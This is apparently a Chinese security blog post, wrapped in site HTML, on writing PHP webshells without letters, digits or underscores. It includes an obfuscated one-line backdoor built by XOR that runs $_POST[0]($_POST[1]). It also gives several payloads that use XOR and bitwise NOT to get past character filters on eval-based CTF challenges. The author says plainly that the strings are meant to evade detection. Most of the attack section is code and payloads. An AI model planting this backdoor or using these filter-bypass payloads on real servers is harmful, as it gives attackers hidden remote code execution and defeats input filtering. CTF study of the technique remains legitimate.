@@ -1,0 +1,1024 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+  <link rel="manifest" href="/images/manifest.json">
+
+
+  <meta name="msapplication-config" content="/images/browserconfig.xml" />
+
+
+
+  <meta name="keywords" content="web安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="首先要了解一下php中异或的用法先看以下代码 123&amp;lt;?php    echo &amp;quot;A&amp;quot;^&amp;quot;?&amp;quot;;?&amp;gt;">
+<meta name="keywords" content="web安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php编写不使用字母下划线的shell">
+<meta property="og:url" content="http://yoursite.com/2018/10/03/phpshell/index.html">
+<meta property="og:site_name" content="绝世狂龙">
+<meta property="og:description" content="首先要了解一下php中异或的用法先看以下代码 123&amp;lt;?php    echo &amp;quot;A&amp;quot;^&amp;quot;?&amp;quot;;?&amp;gt;">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-482cb44cc9c09739.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-6bcf0d2b3597eddd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-0aeb36a03e1b77fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-c4b5be27e570f66b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-7d9acf7609cbecf3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-238ab8f1502536a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/9113981-2805feb88b65647a.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/9113981-5064ea460f30c5a9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-10-03T08:49:13.891Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php编写不使用字母下划线的shell">
+<meta name="twitter:description" content="首先要了解一下php中异或的用法先看以下代码 123&amp;lt;?php    echo &amp;quot;A&amp;quot;^&amp;quot;?&amp;quot;;?&amp;gt;">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/9113981-482cb44cc9c09739.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/03/phpshell/"/>
+
+
+
+
+
+
+  <title>php编写不使用字母下划线的shell | 绝世狂龙</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">绝世狂龙</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">今天很残酷，明天更残酷，但后天会很美好！</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            友情链接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-message">
+          <a href="/message/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            留言
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/03/phpshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="berlin">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/zhenzhen.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="绝世狂龙">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">php编写不使用字母下划线的shell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-03T16:45:20+08:00">
+                2018-10-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web安全/" itemprop="url" rel="index">
+                    <span itemprop="name">web安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>首先要了解一下php中异或的用法<br>先看以下代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;A&quot;^&quot;?&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<p>运行结果<br><img src="https://upload-images.jianshu.io/upload_images/9113981-482cb44cc9c09739.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"><br>我们可以看到，输出的结果是字符”~”。之所以会得到这样的结果，是因为代码中对字符”A”和字符”?”进行了异或操作。在PHP中，两个变量进行异或时，先会将字符串转换成ASCII值，再将ASCII值转换成二进制再进行异或，异或完，又将结果从二进制转换成了ASCII值，再将ASCII值转换成字符串。异或操作有时也被用来交换两个变量的值。</p>
+<p>比如像上面这个例子</p>
+<p>A的ASCII值是65，对应的二进制值是01000001</p>
+<p>?的ASCII值是63，对应的二进制值是00111111</p>
+<p>异或的二进制的值是01111110，对应的ASCII值是126，对应的字符串的值就是~了</p>
+<p>我们都知道，PHP是弱类型的语言，也就是说在PHP中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于PHP弱类型的这个特点，我们对PHP的变类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function B()&#123;</span><br><span class="line">        echo &quot;Hello world&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__= &quot;?&quot; ^ &quot;&#125;&quot;;</span><br><span class="line">    $__();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-6bcf0d2b3597eddd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p>我们一起来分析一下上面这段代码：<br>    <code>$_++;</code>这行代码的意思是对变量名为<code>&quot;_&quot;</code>的变量进行自增操作，在PHP中未定义的变量默认值为null,null==false==0,我们可以在不使用任何数字的情况下,通过对未定义变量的自增操作来得到一个数字。<br>    <code>$__=&quot;?&quot; ^ &quot;}&quot;;</code>对字符”?”和”}”进行异或运算，得到结果B赋给变量名为”<strong>“(两个下划线)的变量<br>    `$ </strong> (); <code>通过上面的赋值操作，变量</code>\$__`的值为B，所以这行可以看作是B(),在PHP中,这行代码表示调用函数B,所以执行结果为Hello world。在PHP中，我们可以将字符串当作函数来处理。</p>
+<p>看到这里，相信大家如果再看到类似的PHP后门应该不会那么迷惑了，你可以通过一句句的分析后门代码来理解后门想实现的功能。</p>
+<p>我们希望使用这种后门创建一些可以绕过检测的并且对我们有用的字符串，如_POST”, “system”, “call_user_func_array”，或者是任何我们需要的东西。</p>
+<p>下面是个非常简单的非数字字母的PHP后门：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    @$_++; // $_ = 1</span><br><span class="line">    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _</span><br><span class="line">    $__.=(&quot;.&quot;^&quot;~&quot;); // _P</span><br><span class="line">    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO</span><br><span class="line">    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS</span><br><span class="line">    $__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>在这里我说明下，.=是字符串的连接，具体参看php语法</p>
+<p>我们甚至可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);</span><br></pre></td></tr></table></figure></p>
+<h4 id="不用数字和字母写shell的一道实例："><a href="#不用数字和字母写shell的一道实例：" class="headerlink" title="不用数字和字母写shell的一道实例："></a>不用数字和字母写shell的一道实例：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这一串代码描述是这样子，我们要绕过A-Za-z0-9这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符，并且字符串长度小于40。然后再利用 PHP允许动态函数执行的特点，拼接处一个函数名，这里我们是 “getFlag”，然后动态执行之即可。</p>
+<p>那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到getFlag函数，然后拿到webshell。<br>我们最终是要读取到那个getFlag函数，我们需要构造一个_GET来去读取这个函数，我们最终构造了如下字符串：<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=getFlag</span><br><span class="line"></span><br><span class="line">这里的&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;是异或的简短写法，表示_GET。</span><br><span class="line">$&#123;$_&#125;[_]($&#123;$_&#125;[__]);等于$_GET[_]($_GET[__]);也就等于getFlag()</span><br><span class="line">把_当作参数传进去执行getFlag()</span><br></pre></td></tr></table></figure></p>
+<p><strong>①构造_GET读取</strong></p>
+<p>首先我们得知道_GET由什么异或而来的，经过我的尝试与分析，我得出了下面的结论：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;//_GET</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这段代码是啥意思呢？因为40个字符长度的限制，导致以前逐个字符异或拼接的webshell不能使用。<br>这里可以使用php中可以执行命令的反引号<code></code> 和Linux下面的通配符?</p>
+<pre><code>? 代表匹配一个字符
+` 表示执行命令
+&quot; 对特殊字符串进行解析
+</code></pre><p>由于?只能匹配一个字符，这种写法的意思是循环调用，分别匹配。我们将其进行分解来看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&#123;&quot;^&quot;&lt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>输出为G<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&#123;&quot;^&quot;&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>输出为E<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&#123;&quot;^&quot;/&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>输出为T</p>
+<p>所以_GET就是这么被构造出来的<br><strong>②获取_GET参数</strong></p>
+<p>如何获取呢？咱们可以构造出如下字串：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo $&#123;$_&#125;[_]($&#123;$_&#125;[__]);//$_GET[_]($_GET[__])</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>根据前面构造的来看，$_已经变成了_GET。</p>
+<p>顺理成章的来讲，$_ = _GET这个字符串。</p>
+<p>我们构建$_GET[ __ ]是为了要获取参数值</p>
+<p><strong>③传入参数</strong></p>
+<p>此时我们只需要去调用getFlag函数获取webshell就好了，构造如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo $_=getFlag;//getFlag</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>所以把参数全部连接起来，就可以了~~<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=getFlag</span><br></pre></td></tr></table></figure></p>
+<p>这里在本地搭了一个。。<br><img src="https://upload-images.jianshu.io/upload_images/9113981-0aeb36a03e1b77fd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-c4b5be27e570f66b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>可见命令能执行成功。。</p>
+<h4 id="不用数字，字母和下划线写shell的实例"><a href="#不用数字，字母和下划线写shell的实例" class="headerlink" title="不用数字，字母和下划线写shell的实例"></a>不用数字，字母和下划线写shell的实例</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &apos;flag.php&apos;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;code&apos;]))&#123;</span><br><span class="line">    $code = $_GET[&apos;code&apos;];</span><br><span class="line">    if(strlen($code)&gt;50)&#123;</span><br><span class="line">        die(&quot;Too Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code))&#123;</span><br><span class="line">        die(&quot;Not Allowed.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">//$hint =  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>下划线都不给，意味着不能定义变量，而且也构造不出来数字。这是大佬给的payload，+号必须加引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;$&quot;.(&quot;`&quot;^&quot;?&quot;).(&quot;:&quot;^&quot;&#125;&quot;).(&quot;&gt;&quot;^&quot;&#123;&quot;).(&quot;/&quot;^&quot;&#123;&quot;).&quot;[&apos;+&apos;]&quot;&amp;+=getFlag();//$_GET[&apos;+&apos;]&amp;+=getFlag();</span><br></pre></td></tr></table></figure></p>
+<p>51个字符太长了，所以这里可以用简短的写法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&apos;$&apos;).(&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;).([&apos;+&apos;])&amp;+=getFlag();</span><br></pre></td></tr></table></figure></p>
+<p>不过这样不能成功。<br>大佬给出了解释：<strong>eval只能解析一遍代码，所以如果写的是a.b这样的字符串拼接，就只会执行这个拼接，并不会去执行代码</strong><br>例如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`eval($_GET[&apos;b&apos;])` url里面 `b=phpinfo();` 这时候相当于`eval(&apos;phpinfo();&apos;)`</span><br><span class="line">`eval($_GET[&apos;b&apos;])` url里面`b=$_GET[c]&amp;c=phpinfo();` 相当于`eval(&apos;$_GET[c]&apos;)`</span><br><span class="line">上面的payload是`code=$_GET[&apos;+&apos;]&amp;+=getFlag();` ，也就是`eval(&apos;$_GET[&apos;+&apos;])`并不会执行getFlag();</span><br></pre></td></tr></table></figure></p>
+<p>正确的payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;&#125;[&apos;+&apos;]();&amp;+=getFlag</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里利用了`$&#123;&#125;`中的代码是可以执行的特点，其实也就是可变变量。</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $a = &apos;hello&apos;;</span><br><span class="line">    $$a = &apos;world&apos;;</span><br><span class="line">    echo &quot;$a $&#123;$a&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出：hello world</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">`$&#123;$a&#125;`，括号中的`$a`是可以执行的，变成了hello。</span><br><span class="line">payload中的&#123;&#125;也是这个原理，&#123;&#125;中用的是异或，`^`在&#123;&#125;中被执行了，也就是上面讲的”`&#123;&#123;&#123;“^”?&lt;&gt;/”执行了异或操作，相当于_GET。</span><br><span class="line"></span><br><span class="line">最后eva函数拼接出了字符串`$_GET[&apos;+&apos;]()`;，然后传入+=getFlag，最后执行了函数getFlag();</span><br><span class="line"></span><br><span class="line">**大佬给出的payload`http://localhost/getflag.php?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag`**</span><br><span class="line">这里用的是取反</span><br><span class="line"></span><br><span class="line">~在&#123;&#125;中执行了取反操作，所以`$&#123;~&quot;\xa0\xb8\xba\xab&quot;&#125;`取反相当于`$_GET`。</span><br><span class="line">跟上面的payload一个原理，拼接出了`$_GET[&apos;+&apos;]();`，传入+=getFlag()从而执行了函数。</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-7d9acf7609cbecf3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>
+<p>还有一种拼接的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=$啊=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$啊();</span><br></pre></td></tr></table></figure>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113981-238ab8f1502536a7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原理大同小异，`$啊=getFlag;$啊();`，这里就不需要用&#123;&#125;了，因为取反的值直接被当作字符串赋值给了$啊。</span><br></pre></td></tr></table></figure></p>
+<h3 id="PHP中取反-的概念"><a href="#PHP中取反-的概念" class="headerlink" title="PHP中取反(~)的概念"></a>PHP中取反(~)的概念</h3><p>来看一个汉字”和”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> print(&quot;和&quot;.encode(&apos;utf8&apos;))</span><br><span class="line">b&apos;\xe5\x92\x8c&apos;</span><br><span class="line"> print(&quot;和&quot;.encode(&apos;utf8&apos;)[2])</span><br><span class="line">140</span><br><span class="line"> print(~&quot;和&quot;.encode(&apos;utf8&apos;)[2])</span><br><span class="line">-141</span><br><span class="line">“和”的第三个字节的值为140[0x8c]，取反的值为-141。</span><br><span class="line">负数用十六进制表示，通常用的是补码的方式表示。负数的补码是它本身的值每位求反,最后再加一。141的16进制为0xff73，php中chr(0xff73)==115，115就是s的ASCII值。</span><br><span class="line">因此</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$_=&quot;和&quot;;</span><br><span class="line">print(~($_&#123;2&#125;));</span><br><span class="line">print(~&quot;\x8c&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">两个写法性质一样</span><br><span class="line">结果会输出： ss</span><br></pre></td></tr></table></figure></p>
